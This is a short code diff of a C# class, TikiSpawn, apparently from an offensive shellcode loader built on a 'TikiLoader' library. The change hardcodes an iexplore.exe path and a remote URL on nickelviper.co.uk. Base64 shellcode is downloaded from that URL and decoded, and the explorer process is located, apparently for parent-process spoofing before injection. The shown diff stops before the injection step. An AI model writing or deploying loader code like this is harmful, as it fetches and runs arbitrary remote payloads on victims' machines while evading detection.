@@ -1,18 +1,10 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Net;
-using System.Runtime.InteropServices;
 using TikiLoader;
 
-[ComVisible(true)]
 public class TikiSpawn
 {
-
-    public TikiSpawn()
-    {
-        Flame(@"", @"");
-    }
-
     private static string GetData(string url)
     {
         WebClient client = new WebClient();
@@ -21,7 +13,7 @@ public class TikiSpawn
         return client.DownloadString(url);
     }
 
-    public static int FindProcessPid(string process)
+    private static int FindProcessPid(string process)
     {
         int pid = 0;
 
@@ -41,8 +33,11 @@ public class TikiSpawn
 
     }
 
-    private void Flame(string binary, string url)
+    public void Flame()
     {
+        string binary = @"C:\\Program Files\\Internet Explorer\\iexplore.exe";
+        string url = @"http://nickelviper.co.uk/shellcode.txt";
+
         byte[] shellcode = Convert.FromBase64String(GetData(url));
         int ppid = FindProcessPid("explorer");
 
